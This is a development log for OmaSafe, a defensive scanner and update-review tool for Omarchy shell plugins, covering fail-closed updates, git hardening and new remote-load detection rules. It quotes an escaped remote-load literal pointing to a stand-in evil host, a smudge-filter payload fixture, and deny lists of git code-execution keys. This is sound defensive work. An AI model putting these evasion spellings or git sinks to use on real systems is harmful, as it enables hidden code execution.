`plugins review-update ID [--expected-commit SHA] [--yes]` implements the
reviewed update flow end to end. Pre-flight refusals happen before any
mutation: dirty installed worktrees (and unknown git state) are rejected,
a trusted baseline is required, and the plugin origin must be HTTPS. The
candidate commit comes either from `--expected-commit` or from the pinned
registry claim in the cached catalog snapshot (`listed`/`installed-differs`
correlations only); an already-pinned HEAD short-circuits as a no-op.

The exact candidate is fetched into the bounded analysis cache
(`ensure_pinned_repository`, quota + lock inherited), materialized into a
temp checkout, and evaluated before anything touches the live tree: native-
parity manifest validation (S6 mirror) must pass, and the full analysis
pipeline produces findings/capabilities for the delta presentation — added
and resolved rule ids, capability changes versus the last recorded analysis
event, content-digest movement, a capped source diff trusted..candidate,
coverage limitations, and registry context. Approval mirrors the v0.1 rule:
interactive confirmation requires a terminal; `--yes` is accepted only
together with `--expected-commit` matching the candidate exactly.

Mutation is delegated to the native updater (`omarchy plugin update ID
--yes`; fetch/fast-forward, validation with ORIG_HEAD rollback, rescan) via
new bounded wrappers in omasafe-plugin-trust — OmaSafe never forks that
lifecycle logic. Active full-bar plugins are switched back to the default
bar first; enabled plugins are disabled first; both actions are recorded in
an interrupted-state record (`state/review-update.json`) written before the
first mutation and removed at terminal states. A stale record prints manual
recovery guidance and an unreadable one refuses to run.

Postconditions gate everything: fresh inventory must show HEAD equal to the
reviewed commit and a readable shell rescan before re-enabling; trust
advances only after that. Raced candidates (native updater has no expected-
SHA guard yet) leave the plugin disabled with explicit recovery guidance —
including the reset command to restore the reviewed commit — and never
advance trust. Native failures keep the rollback result, stay disabled, and
keep the record for recovery.

Test matrix covers all nine plan rows against real git repositories through
a fake omarchy shim driven by per-invocation environment variables: dirty
refusal, missing baseline, `--yes` without pin fail-fast, happy path
(disable→update→enable ordering, trust advance, record cleanup), invalid
manifest abort, native failure guidance, raced commit detection (trust
proven untouched), rescan failure, interrupted-record guidance, full-bar
switch ordering, and registry-claim resolution feeding the preview.

Gates green in both configurations; 193 parser-backed / 183 lexical tests.
Known limitation carried deliberately: the race window between evaluation
and native mutation exists because the upstream updater lacks an expected-
commit option — the flow detects it post-hoc instead of preventing it;
the upstream proposal is tracked in docs/plans/later.md.

Next: **v0.2 S8 — UI, packaging, release**.

## S8 — UI, packaging, release (2026-08-26)

**Cancellation and interruption safety** (the explicit M9 requirement).
SIGINT/SIGTERM handlers set an atomic flag (omasafe-core::interrupt); the
bounded-child poll loops watch the same flag, so one Ctrl-C stops in-flight
git/updater processes promptly and every long-running command unwinds
through its normal cleanup paths instead of dying mid-write. Phase-boundary
checkpoints cover `plugins analyze`, `scan-plugin`, and `review-update`;
interrupted exits use 130. review-update interruption is fail-closed at
every stage: during quiescing or the native update the plugin stays
disabled with the recovery record kept; after a verified update but before
re-enable/trust, the flow stops with manual completion steps — trust never
advances on an interrupted run. Temporary candidate checkouts orphaned by
hard deaths are swept by pid liveness at each run's start.

**Panel data contract.** `scan-plugin --format json` / `plugins analyze
--format json` already carried everything the omarchy panel consumes; an
integration test now pins the schema: analysis sections (findings with
rule_id/severity/confidence/evidence, capabilities, invocation_edges,
coverage_limitations, fingerprint, policy_identity, equivalence), payload
inventory sections, and the parser block whose explicit null in
lexical-fallback builds is itself the visible degradation signal. The
panel-side views live in the sibling omasafe-plugin repo and evolve there
against this pinned contract.

**Release tooling.** `scripts/release-gate.sh` implements the release
checklist verbatim: format + clippy/tests in BOTH configurations,
generated-asset currency, determinism canary, corpus-tooling self-tests,
a bounded corpus sample, native-validator parity, the self-scan of
OmaSafe's own source, and provenance — writing all evidence reports to
release-reports/. The tag-triggered workflow gained a reports job that
generates self-scan/corpus/parity JSON in CI and publishes them as release
assets alongside the signed archive. Clean-VM lifecycle checks
(install/upgrade/downgrade/uninstall via the reviewed pinned installer,
schedule coexistence, panel enable/rescan/disable lifecycle, third-party-
bar notification independence) are codified in `scripts/vm-lifecycle.sh`
for per-release runs against a fresh VM snapshot.

Verified locally end-to-end: gate exit 0 with live corpus sample (12
scanned, 0 incomplete) and parity (12 compared, 0 disagreements against
4.0.1); self-scan produced 13 findings / 160 capability observations with
disclosed coverage limitations. Remaining manual steps before v0.2 tagging:
review the self-scan findings, confirm the nightly full-corpus baseline is
provisioned, sign the tag. The sibling panel repo ships its views
separately with its own update cadence, as documented in the README.

Codex review of the S8 slice returned CHANGES-REQUIRED with eight blockers,
all fixed and re-verified. The recovery record is now durably stored before
the first quiescing action, every quiesce failure keeps it (phase "failed")
instead of deleting it, and an unresolved record for a DIFFERENT plugin
blocks a new review outright — records can no longer be overwritten or
dropped by unrelated operations. An interrupt during final re-enable is
reported as a 130 exit with manual completion steps instead of a successful
run; the shared analysis emitter gained an output-commitment checkpoint so
`plugins analyze` / `scan-plugin` / `scan` honor interrupts that land during
analysis rather than completing with exit 0; interrupt messages state the
actual phase instead of claiming "no partial state". The stale-checkout
sweeper replaced pid heuristics with kernel-owned ownership: each checkout
carries a flock-held `.owner.lock`, so sweepers remove only checkouts whose
owner provably died (pid reuse is irrelevant), verified by the updated test
using unique per-run directory names. Non-Unix bounded loops now also honor
the flag, signal registration uses libc constants, the SIGINT test helper
drains pipes concurrently to rule out deadlocks, and the release workflow's
reports job creates its output directory. The release gate became strict:
corpus runs execute with --gate-high (unaccounted high severity fails the
release), incomplete repositories block via an explicit report check, and
parity must be status "compared" with zero disagreements on the recorded
version — degraded parity blocks rather than passes. vm-lifecycle.sh was
rewritten against the real installer URL (raw install-cli.sh at the tag),
with correct remote-expansion quoting and an uninstall step plus post-
uninstall persistence verification. Final strict gate run: exit 0 with
--gate-high passed, zero incomplete, parity 12 compared / 0 disagreements.

Next: **v0.2 tag** (signed) once the nightly full-corpus baseline is
provisioned and the self-scan findings get their triage pass.


## v0.2.1 H1 — Fail-Closed Reviewed Update and Severity Fidelity

Status: **complete**

Implemented (per `docs/plans/v0.2.1-hardening-implementation.md`, scope
source `docs/reviews/2026-08-27-scan-rule-coverage-review.md`):

- Review-update post-update dirty postcondition now fails closed for BOTH
  `dirty == Some(true)` and unknown (`None`) worktree state — the same
  uncertainty the pre-flight already refuses — leaving the plugin disabled,
  keeping the flow record in phase "failed", and never re-enabling or
  advancing trust.
- New installed-bytes verification between the native mutation and any
  re-enable: a dedicated `worktree_content_map` compares every file under the
  INSTALLED tree against the approved candidate checkout byte-for-byte
  (mode + size + content digest, symlink targets included; only the `.git`
  subtree and the checkout's own `.owner.lock` are excluded). HEAD matching
  with divergent bytes — e.g. a payload smuggled in through `.gitignore` — is
  now caught where the old checks passed it.
- Analyzer policy identity captured before mutation and re-checked after:
  a mid-flight policy change fails closed instead of trusting an analysis
  made under different rules.
- Installed-tree analysis coverage state and analysis fingerprint must match
  the approved candidate; mismatches leave the plugin disabled without
  advancing trust.
- Trust advances from the identity of the verified INSTALLED tree, never from
  the temporary staging checkout.
- Severity fidelity: new analyzer finding rules no longer collapse into one
  generic "warning" alert — each added rule id emits its own alert carrying
  the catalog severity and title. `track_highest_severity` was rewritten to a
  single ladder over both vocabularies (`none < info < low < warning <
  medium < error < high < critical`) so `error`/`high` alerts can no longer
  be flattened to `warning`; `scan` JSON `highest_severity` reflects it.
  Desktop notification bodies now carry `[severity]`.
- Tests: review-update against a post-mutation dirty worktree, an unavailable
  git status, and a planted `.gitignore`-hidden payload all fail with nonzero
  exit, plugin left disabled, trust not advanced, and no enable attempted;
  finding-regression alerts assert catalog severity survives to
  `highest_severity`.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace
scripts/release-gate.sh --skip-network                   # exit 0
```

Next: H2 (reference sinks) with the split severity from the H0 record.

## v0.2.1 H0/H1 — Review-Response Revision (second pass)

Status: **complete**

Three review passes closed seventeen findings (seven in the second, five in
the final residual pass). The earlier revision text (custom worktree walker, wholesale
`.git` exclusion, notify-send assertion) described since-replaced machinery
and is superseded by this entry.

H0 — runtime reverification and lifecycle boundary (complete, machine-executed):

- `scripts/h0-runtime-reverify.sh` probes run isolated quickshell instances
  with loopback-served inert QML. Probe A: network `Loader.source` REACHABLE
  (marker instantiated). Probe B was corrected to wait for asynchronous
  completion — `Qt.createComponent("http://...")` enters Loading and reaches
  Ready with a working instance, so remote component creation IS reachable and
  the planned High rule covers both sinks. Probe C: remote directory imports
  are scanner-intercepted (URL normalizes onto a relative path and is dropped)
  — H2 ships them as an indicator, not the High finding; the plan doc was
  updated to split severity by sink.
- Probe D runs the REAL native install helper (`omarchy plugin add
  <local marker repo> --enable --yes`) against a SECOND omarchy shell launched
  from a disposable config copy with a disposable HOME (unique instance path;
  the live session shell is never addressed) behind an explicit
  `OMASAFE_H0_ALLOW_LIFECYCLE=1` guard. Assertions: helper exit 0, marker
  discovered and enabled, IPC-only disable transition (true -> false), no
  leftover hidden `.add.tmp.*` staging directory.
- The script asserts expected markers per probe AND validates each probe's
  exit status: probe B and the type-missing branch of probe C require exit 0,
  the scanner-interception branch of probe C requires the verified runtime's
  255, and any other status (timeout kill included) fails the probe. Exit 0
  only when every probe produced its expected verdict; 1 on any timeout,
  error marker, missing marker, forbidden marker, unexpected exit status, or
  failed transition; 2 on lifecycle-guard refusal. Probe guards stop
  themselves once the verdict lands so success never trips the timeout
  ceiling.
- Surface doc re-stamped 2026-08-27 (Omarchy 4.0.1-1 / Quickshell 0.3.1-1;
  package changed from quickshell-git, triggering the reverification) with
  the three reverified answers and the InputInjection / ScreenCapture /
  SensitiveDataAccess capability vocabulary. Clean-VM re-run of the script is
  the remaining release step.

H1 — fail-closed reviewed update and severity fidelity (final design):

- Audits run BEFORE mutation. The native updater executes `git fetch` +
  `git merge`, which would run a pre-existing `post-merge` hook and honor
  every .git/config directive before any postcondition could report them, so
  `audit_installed_git_state` (active-hook audit + config allowlist) gates the
  delegated update: on refusal the updater is never invoked.
- The update window is hardened in depth, with one accepted residual recorded
  below. `run_omarchy` inherits the full Git hardening (global/system config
  neutralized; `core.fsmonitor=false`, `core.hooksPath=/dev/null`, empty
  `diff.external`, `protocol.ext.allow=never`, and an empty `credential.helper`
  that resets any raced helper list, injected via GIT_CONFIG_COUNT env with
  command-line precedence), so a writer racing the window cannot make
  fetch/merge execute fsmonitor/hook/credential/diff commands. Subsection-keyed
  sinks (`filter.<name>`, `merge.<name>.driver`, `url.<base>.insteadOf`) cannot
  be enumerated, so `GitConfigGuard` swaps the audited `.git/config` for a
  hardened minimal snapshot — which DEFINES no such sink — for the duration of
  the delegated update and restores the original afterwards, including on
  failure and interrupt. The `hardened_config_neutralizes_a_smudge_filter`
  regression proves this by content: a real `filter.evil.smudge` payload runs
  under a positive control without hardening, and never runs while the snapshot
  is in place.
- Accepted residual (same-UID execution): the swap neutralizes sinks by
  content, but it cannot make a file the file's own owner is forbidden to
  rewrite. A same-UID process that races a NEW `.git/config` carrying a
  subsection-keyed sink into place between the swap and Git's read can still get
  that command executed during fetch/merge — userspace cannot prevent this
  without privilege. It is instead made NON-TRUST-ADVANCING: the restore is
  tamper-evident via a metadata witness (inode/ctime/mtime/size, not just
  bytes, so a write-then-revert-to-identical-bytes is still caught), so any
  concurrent write is detected, discarded, and fails the update — trust never
  advances over a tampered window even though the injected command may already
  have run. A regression fixture appends `core.fsmonitor` synchronously before
  the fake updater's git fetch; the update completes native Git work without
  executing the injected command and is then refused, leaving the plugin
  disabled and the config clean.
- The config audit parses with Git itself under bounded hardened settings
  (`config --file .git/config --list --null`, so CLI-injected hygiene
  settings can never leak into the audit). The allowlist is EXACT keys with
  VALUE validation — no broad namespaces: `gc.*` is denied wholesale (Git
  executes `gc.recentObjectsHook`-style values through the shell),
  `remote.origin.url` must equal the production HTTPS origin exactly
  (ext::/scp-style/paths refused) and `remote.origin.fetch` must be the
  standard tracking refspec, branch tracking remotes must be remote names
  (never paths), and pull/fetch/push keys are enumerated with enum values.
  hooksPath, sshCommand, fsmonitor, askPass, credential helpers, diff/gpg
  programs, aliases, filters, includes, insteadOf, and submodule machinery
  all fail closed by absence. Unit tests pin executable/redirecting key
  refusals and origin/refspec value validation.
- Installed-vs-candidate verification is layered. Byte equality via
  SourceIdentity's collector covers the worktree (tracked, ignored, hidden)
  on both sides; git internals that legitimately differ between a detached
  review checkout and a branch-based installed clone (.git/HEAD,
  packed-refs, template hook samples, .git/config, the checkout-side
  .owner.lock) are exempt from BYTES and verified semantically instead:
  resolved tree identity (installed HEAD^{tree} must equal the candidate's
  tree object, with HEAD already pinned to the candidate) plus the audits
  above.
- ANY SourceIdentity limitation on either side fails closed (file_limit,
  unreadable_directory/file, metadata_unavailable, oversize_file,
  aggregate_byte_limit, tree_depth_limit, directory_entry_limit,
  git_hooks_unreadable, git_metadata_unreadable, git_metadata_oversize,
  git_hook_unreadable, git_hook_oversize, collection budget, interruption):
  a partial digest map can never prove byte equality.
- The traversal machinery in omasafe-plugin-trust was rewritten as a bounded
  collector: MAX_TREE_DEPTH recursion cap, per-directory child cap checked
  DURING accumulation (entry bombs stop before materializing), global
  MAX_FILES/aggregate-byte limits, a wall-clock collection budget, and
  cooperative interruption — every bound surfacing as a visible limitation.
  The .git metadata capture (config, HEAD, packed-refs, EVERY hooks entry)
  runs through the same bounds — the same caps, the same byte accounting, the
  same budget and interruption checks — so a hook-directory entry bomb or
  hook flood surfaces a limitation instead of bypassing the collector. Git
  metadata and hook reads are capped at `MAX_METADATA_BYTES` and disclose
  truncation rather than silently accepting equal prefixes; once the
  aggregate budget is exhausted the collector retains only bounded size
  sentinels, so retained bytes stay within the advertised 64 MiB no matter
  how many metadata or hook files follow. Unit tests pin deep-tree,
  entry-bomb, hook-bomb, metadata-truncation, and aggregate-budget behavior.
- The candidate checkout now shapes its origin remote exactly like an
  installed clone (remote add + set-url to the production HTTPS URL) and the
  test fixture installs branch-based (symbolic HEAD) checkouts, matching
  native clones.
- Severity fidelity unchanged from the first pass: per-rule catalog-severity
  alerts, ladder-ordered highest severity, `[severity]` in notification
  bodies, and tests proving a High finding (oma.qml.session-lock) reaches
  the notify-send payload as `[high]`.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 62 cli + 15 trust tests
scripts/h0-runtime-reverify.sh                           # probes A/B/C
OMASAFE_H0_ALLOW_LIFECYCLE=1 scripts/h0-runtime-reverify.sh --with-lifecycle
```

Next: H2 (reference sinks) with the split severity from the H0 record; clean-VM
re-run of the H0 script before tagging.

## v0.2.1 H2 — Reference Sinks: Remote, Out-of-Tree, Typed Rejections

Status: **complete**

Implemented per `docs/plans/v0.2.1-hardening-implementation.md` (maps to review
findings R-1 and R-2), with the severity split the H0 record fixed:

- New High rule `oma.qml.remote-component-load`: a URL-scheme literal at the
  two H0-verified reachable load positions — `Loader.source` and
  `Qt.createComponent(...)`. Until now a literal remote `Loader` source took
  the `Value::Static` branch and was silently dropped as an unresolvable
  reference; the network detectors never saw it either.
- New indicator `oma.qml.remote-directory-import` (Low, never the High rule):
  remote directory imports, `as`-qualified or bare, with or without a qmldir.
  Per H0 probe C these are scanner-intercepted on the pinned runtime, so the
  rule records intent; its guidance demands re-probing any newer runtime
  before escalation. Local relative directory imports stay silent.
- New Medium rule `oma.qml.out-of-tree-reference`: absolute-path and traversal
  references at load sinks (`Loader.source`, `Qt.createComponent`, `Qt.include`)
  and in directory-import specifiers. Summary and guidance describe these as
  unreviewed out-of-tree loads that bypass commit-bound review — explicitly
  not sandbox escapes; there is no runtime sandbox.
- `Qt.createComponent(` and `Qt.include(` joined both dynamic-code needle
  sets: the AST call list (`eval | createQmlObject | atob` -> `+ createComponent
  | include`) and the lexical set, so both spellings carry
  `oma.qml.dynamic-code` and the `dynamic-code-execution` capability.
- Typed sink-position rejections (R-2): reference candidates now carry a sink
  marker for the six verified positions (`Loader.source`,
  `Qt.createComponent`, `Qt.include`, `Process.command`, `execDetached`,
  `FileView.path`). When a sink-position candidate fails in-tree resolution,
  `analyze_inventory` records a `sink-reference-rejected:<reason>` limitation
  with reason `remote`, `absolute`, `traversal`, `missing-local-target`, or
  `unsupported-scheme`, sorted and deduplicated for deterministic reports.
  A finding-bearing spelling (remote at a load sink, out-of-tree at a load
  sink) is consumed by its finding — the two disclosures never double-report
  the same literal. Non-sink path-shaped strings stay inventory context
  exactly as before, so icon names, format strings, and unresolvable
  non-sink paths produce nothing.
- Rejection classification mirrors `resolve_reference`'s rejection order
  (absolute, then scheme spelling — `http`/`https` are the remote family,
  other schemes are `unsupported-scheme` — then traversal after stripping the
  ordinary leading `./`, then `missing-local-target`).
- AST/lexical parity: the AST path marks candidates precisely at binding and
  call arguments (static-shaped values only — computed fragments are left to
  the H4 dataflow slice); the lexical fallback marks quoted literals on lines
  that spell a sink construct and handles `import "<specifier>"` lines.
  Multi-line lexical constructs degrade to context, consistent with the
  documented lexical-fallback semantics.
- Resolved sink references still form invocation edges and mark
  `invocation_target` (local `Loader`, `FileView.path`, and `Qt.include`
  targets are unchanged behavior).
- New adversarial fixtures under `fixtures/plugins/` (each a valid plugin
  tree, load-bearing via CLI tests): `remote-component-loader`,
  `remote-create-component`, `remote-directory-import` (remote + local qmldir
  variant), `out-of-tree-absolute`, `out-of-tree-traversal`, and
  `benign-references` (icon names, format strings, commented URL, non-sink
  path-shaped string, resolving local Loader). Loader bindings are spelled
  single-line so both feature configs exercise sink marking; multi-line
  Loader blocks degrade to context in lexical builds by design.
- Catalog: `RULE_CATALOG_VERSION` 3 -> 4; `SEVERITY_TABLE_VERSION` unchanged
  (new rules are a catalog change, not a severity-table rewrite). The
  surface-anchor test pins the three H0-verified anchors.

Tests: analyzer unit tests cover literal-remote Loader/createComponent High
findings with per-path confidence, indicator-only directory imports, local
import silence, out-of-tree Medium findings, the `Qt.include`
remote-vs-out-of-tree split, all five typed rejection reasons, non-sink
silence, edge resolution through sink candidates, and lexical JS parity; CLI
tests scan all six fixtures end-to-end and the old negative-provenance test
now asserts the traversal Loader finding instead of expecting silence. The
release-gate self-scan now carries the fixture findings by design (the
adversarial fixtures live in this repository); each fixture produces exactly
the rule it exists to prove.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 70 cli + 15 trust tests
scripts/determinism-canary.sh                            # exit 0
scripts/release-gate.sh --skip-network                   # exit 0
```

Next: H3 (script pattern expansion) and the H7 early-pass triage kickoff for
`oma.script.reverse-shell` and
`oma.script.privileged-shared-temp-controlled`.

## v0.2.1 H2 — Review Response (six findings)

Status: **complete**

Second-pass review found six issues, four of which could miss or falsely
create blocking findings. All six are closed with regression tests; the
review's own escape-hatch fixtures (multi-line Loader spelling) were the only
test changes needed outside the analyzer.

1. **Escaped literals bypassed remote-load detection (P1).**
   `string_literal_content` kept only `string_fragment` nodes, so
   `Loader { source: "\x68ttps://evil.example/W.qml" }` — a valid runtime
   HTTPS URL — was analyzed as `ttps://…` and emitted nothing. String
   extraction now decodes escape sequences (added `decode_js_escapes`):
   `\xHH`, `\uHHHH`, `\u{…}`, the standard single-character escapes, and
   JS unknown-escape semantics (backslash dropped). Decoding happens exactly
   once per escape, at extraction, on both paths — the AST decodes each
   `escape_sequence` node individually so a literal backslash produced by
   `\\` cannot be re-decoded into scheme characters, and the lexical path
   decodes raw literal content at extraction. Evidence carries the decoded
   runtime value; a doubled-backslash literal regresses as NOT remote.
2. **Qualified Loader types were silently missed (P1).** The grammar permits
   `nested_identifier` object types, but `is_loader` and
   `handle_object_definition` examined only direct `identifier` children, so
   `import QtQuick as QQ; QQ.Loader { source: "https://…" }` bypassed sink
   marking. Type resolution now takes the terminal segment of the resolved
   type node (`QQ.Loader` -> `Loader`) for every inventoried object type
   (Loader, Process, FileView, Timer), so qualified spellings reach the same
   sink rules, capability observations, and edge resolution.
3. **Scheme matching was too narrow (P1).** Scheme parsing is centralized in
   `scheme_class` and applied identically by rejection reasons, the
   remote-load family, and the out-of-tree family. Schemes are
   case-insensitive (RFC 3986), so `HTTPS://…` now carries the High finding
   with its original spelling preserved in evidence. The remote set is the
   network transports Qt's component loader accepts on the pinned runtime
   (`http`, `https`). `file://` URLs are classified as local paths — the
   Medium out-of-tree family at load sinks, and the `absolute` rejection
   reason at non-load sinks — never remote, never plain `unsupported-scheme`.
4. **User-defined methods could become Qt findings (P1).** `callee_name` is
   the last member segment, so `backend.createComponent("https://…")` was
   treated as `Qt.createComponent`. AST call handling now verifies the
   receiver is the Qt global (identifier `Qt`, not a member expression) for
   `createComponent` and `include` before applying the Qt-specific rules —
   both their sink/reference handling and their dynamic-code emission. The
   lexical path matches only the `Qt.createComponent(`/`Qt.include(`
   spellings, which cannot match a different receiver. `eval`, `atob`,
   `createQmlObject`, and `new Function` keep their published receiver-blind
   semantics.
5. **Rejection resolution ignored the analysis budget and had no output cap
   (P1).** The resolution loop now checks `TimeBudget::expired()` per edge
   and discloses `analysis_time_budget_exhausted` (deduplicated against the
   scan loop's disclosure) on expiry. Retained sink rejections are capped at
   a new `MAX_SINK_REJECTIONS` (256, wired into the limits configuration and
   hence the policy identity); overflow emits a
   `sink-reference-rejections-truncated:<total>` limitation. An adversarial
   tree of unique sink literals can no longer expand limitation strings
   without bound.
6. **Lexical sink marking attributed every literal on the line (P2).** The
   whole-line marking let `Loader { source: "Panel.qml"; property string
   docs: "https://docs.example" }` produce a High finding for the unrelated
   `docs` value in the no-parser build, and any `command` identifier on a
   standalone-JS line was treated as `Process.command`. Marking is now
   span-scoped: call arguments via `balanced_bracket_span`, binding values
   via `binding_value_span` (Loader.source, FileView.path, Process.command)
   and the `execDetached` argument span. This exposed a latent
   `binding_value_span` bug the new spans depend on: the scalar scan broke
   on `//` inside quoted strings, truncating URL-valued bindings at their
   scheme (`"https:`); the scan is now quote-aware. The review's example now
   yields exactly one rejection for `Panel.qml` and nothing else.

Tests: ten new analyzer tests pin escape decoding (including the
double-backslash non-decode), qualified Loader/Process types, case
insensitivity and `file://` classification, Qt-receiver verification on both
paths, the rejection cap and truncation disclosure, budget-bounded
resolution, and lexical span scoping. Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 111 analyzer (parser) / 101 (lexical)
scripts/release-gate.sh --skip-network                   # exit 0
```

## v0.2.1 H2 — Review Response (second round, four findings)

Status: **complete**

1. **Nested bindings inherited the outer Loader sink (P1).** The object
   brace scope includes nested child objects, and the binding search did not
   track brace depth, so `Loader { Image { source: "https://…" } }` treated
   the nested Image.source as Loader.source and emitted a false High finding
   in lexical mode. `mark_binding_literals` now splits the matched object's
   body into depth-zero segments (slicing only at brace bytes, which are
   ASCII and cannot split a multi-byte character) and marks bindings only
   there; a depth-zero binding next to a nested child still participates.
   AST parity pinned: the parser path already resolved only the owning
   object's direct bindings.
2. **Lexical dynamic-code detection used the old Qt needle (P2).** Sink
   detection verifies the Qt-global receiver via `find_qt_global_calls`, but
   dynamic-code still matched the raw substring, so
   `backend.Qt.createComponent(...)` emitted `oma.qml.dynamic-code` while a
   valid `Qt . createComponent(...)` (whitespace around the dot) emitted the
   remote-load finding but MISSED the required dynamic-code finding and
   capability. Both needles now go through `find_qt_global_calls`, keeping
   dynamic-code and sink verdicts consistent on both shapes.
3. **Overflow count was not unique after the cap (P2).** Once the retained
   unique set is full, omitted rejections are not remembered, so repeating
   the same unretained rejection incremented the overflow counter each time
   while comments described a unique count. The counter is now honestly an
   OCCURRENCE count (`sink_rejections_omitted`, documented in code): remembering
   which values were omitted would need unbounded fingerprints under
   adversarial input. A new test pins that two occurrences of the same value
   past the full set report `sink-reference-rejections-truncated:2`; the
   existing unique-set and duplicate-crowding tests are unchanged.
4. **Formatting gate failed (P1).** `cargo fmt --all` applied; the gate was
   re-run end-to-end (format, clippy both feature configs, workspace tests
   both configs — 111 analyzer tests with the parser / 101 without, 70 CLI
   tests — generated assets, determinism canary, corpus tooling self-tests,
   self-scan) and passes.

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 111 analyzer (parser) / 101 (lexical)
scripts/release-gate.sh --skip-network                   # exit 0
```

Next: H3 (script pattern expansion) and the H7 early-pass triage kickoff for
`oma.script.reverse-shell` and
`oma.script.privileged-shared-temp-controlled`.
